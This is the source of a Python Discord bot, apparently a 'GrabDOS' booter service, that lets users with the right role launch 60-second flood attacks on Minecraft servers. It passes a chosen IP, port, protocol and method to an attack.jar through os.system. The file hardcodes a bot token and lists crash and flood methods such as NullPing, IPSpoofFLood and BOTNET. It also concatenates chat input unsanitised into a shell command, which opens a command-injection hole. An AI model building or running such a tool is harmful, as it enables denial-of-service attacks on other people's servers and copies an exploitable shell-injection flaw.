import discord 
import time
import os
from discord.ext import commands

intents = discord.Intents.default() 
intents.message_content = True

token = "M-T-A-1OTUwMTM1OTM1Njk4OTQ5MA.GiO1Z9.pbF4DzgwQPUrxACYv8ksoD805jqgBufdel8e00"
prefix = ">"
adm = 1090699985919684708 
free = 1090660912458891324

bot = commands.Bot(command_prefix=prefix, intents=intents) 
bot.remove_command('help')

@bot.event
async def on_ready():
    activity = discord.Streaming(name="©", url="https://www.twitch.tv/directory/game/Minecraft") # Статус бота
    await bot.change_presence(status=discord.Status.idle, activity=activity)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): # Выдает ошибку когда команда не найденна!
        await ctx.send(f'❌ Ошибка! Такой команды нет!') # Бот отправляет сообщение что "Команда не найденна!"
        print("Error commands")

    if isinstance(error, commands.MissingRequiredArgument): # Выдает ошибку когда аргумент не найден!
        await ctx.send(f'❌ Ошибка! Ты неправильно указал аргумент!') # Бот отправляет сообщение что "Аргумент не верный!"
        print("Error arguments")

    if isinstance(error, commands.MissingRole): # Выдает ошибку когда роль ниже нужной!
        await ctx.send(f'❌ Ошибка! У тебя нет прав!') # Бот отправляет сообщение что "Нету прав!"
        print("Error permissions")

@bot.command()
async def help(ctx):
    embed = discord.Embed(
            title = f'🎉 | Help menu',
            description = f'''
            >free ip port protocol method - бесплатная стрес-тест атака 
            >vip ip port protocol method - вип стрес-тест атака 
            >premium ip port protocol method - премиум стрес-тест атака 
            >protocols - список протоколов
            >methods - список методов
            ''',
            colour = discord.Colour.from_rgb(164,66,9)
    )
    await ctx.send(embed=embed)

@bot.command()
async def methods(ctx):
    embed = discord.Embed(
            title = f'🎉 | Protocols',
            description = f'''
            Methods: Join, LegitJoin, Localhost, InvalidNames, LongNames, BotJoiner, IPSpoofFLood, Ping, NullPing, LoginPingMulticrasher, BigHandshake, NullPing, QueryFlood, BigPacket, Network, RandomBytes, ExtremeJoin, SpamJoin, NettyDowner, RAM, YooniksCry, ColorCrasher, TCPHIT, queue, BOTNET, TCPBYPASS, UltimateSmasher, ServerFucker, nAntiBotCry
            ''',
            colour = discord.Colour.from_rgb(164,66,9)
    )
    await ctx.send(embed=embed)
@bot.command()
async def prefix(ctx, pref):
    embed = discord.Embed(
            title = f'🎉 | Смена префикса',
            description = f'Префикс сменён на: ' + pref,
            colour = discord.Colour.from_rgb(164,66,9)
    )
    await ctx.send(embed=embed)
    prefix = pref

@bot.command()
async def protocols(ctx):
    embed = discord.Embed(
            title = f'🎉 | Protocols',
            description = f'''
            Protocols: https://minecraft.fandom.com/wiki/Protocol_version
            ''',
            colour = discord.Colour.from_rgb(164,66,9)
    )
    await ctx.send(embed=embed)

@bot.command()
@commands.has_role(adm)
async def admin(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        embed = discord.Embed(
            title = f'❌404.. error',
            description = f'Укажите айпи для атаки!',
            colour = discord.Colour.from_rgb(164,66,9)
        )
        await ctx.send(embed=embed)
    else:
        if port == None:
            embed = discord.Embed(
                  title = f'❌404.. error',
                  description = f'>help для информации',
                  colour = discord.Colour.from_rgb(164,66,9)
                )
            await ctx.send(embed=embed)
        else:
            if protoc == None:
                embed = discord.Embed(
                  title = f'❌404.. error',
                  description = f'>help для информации',
                  colour = discord.Colour.from_rgb(164,66,9)
                )
                await ctx.send(embed=embed)
            else:
                if method == None: 
                 embed = discord.Embed(
                   title = f'❌404.. error',
                   description = f'>help для информации',
                   colour = discord.Colour.from_rgb(164,66,9)
                 )
                 await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(
                     title = f'✔ ADMIN ATTACK',
                     description = f'Атака прошла успешно на: '+ ip + ":" + port + "! \nПротокол: " + protoc + "\nМетод: " + method + "\nВремя: 60 " "\nСила атаки: -1 ",
                     colour = discord.Colour.from_rgb(164,66,9)
                    )
                    embed.set_image(url=f'https://c.tenor.com/XEGiRn-alH8AAAAd/123.gif') # Embed image(boom ea
                    embed.set_footer(text="© 2022 copyright GrabDOS Все права защищенны")
                    await ctx.send(embed=embed)
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 60" + " -1")

@bot.command()
@commands.has_role(free)
async def free(ctx, ip=None, port=None, protoc=None, method=None):
    if ip == None:
        embed = discord.Embed(
            title = f'❌404.. error',
            description = f'Укажите айпи для атаки!',
            colour = discord.Colour.from_rgb(164,66,9)
        )
        await ctx.send(embed=embed)
    else:
        if port == None:
            embed = discord.Embed(
                  title = f'❌404.. error',
                  description = f'>help для информации',
                  colour = discord.Colour.from_rgb(164,66,9)
                )
            await ctx.send(embed=embed)
        else:
            if protoc == None:
                embed = discord.Embed(
                  title = f'❌404.. error',
                  description = f'>help для информации',
                  colour = discord.Colour.from_rgb(164,66,9)
                )
                await ctx.send(embed=embed)
            else:
                if method == None: 
                 embed = discord.Embed(
                   title = f'❌404.. error',
                   description = f'>help для информации',
                   colour = discord.Colour.from_rgb(164,66,9)
                 )
                 await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(
                     title = f'✔ FREE ADMIN ATTACK',
                     description = f'Атака прошла успешно на: '+ ip + ":" + port + "! \nПротокол: " + protoc + "\nМетод: " + method + "\nВремя: 60 " "\nСила атаки: -1 ",
                     colour = discord.Colour.from_rgb(164,66,9)
                    )
                    embed.set_image(url=f'https://c.tenor.com/XEGiRn-alH8AAAAd/123.gif') # Embed image(boom ea
                    embed.set_footer(text="© 2022 copyright GrabDOS Все права защищенны")
                    await ctx.send(embed=embed)
                    os.system("java -jar attack.jar " + ip + ":" + port + " " + protoc + " " + method + " 60" + " -1")
            
bot.run(token)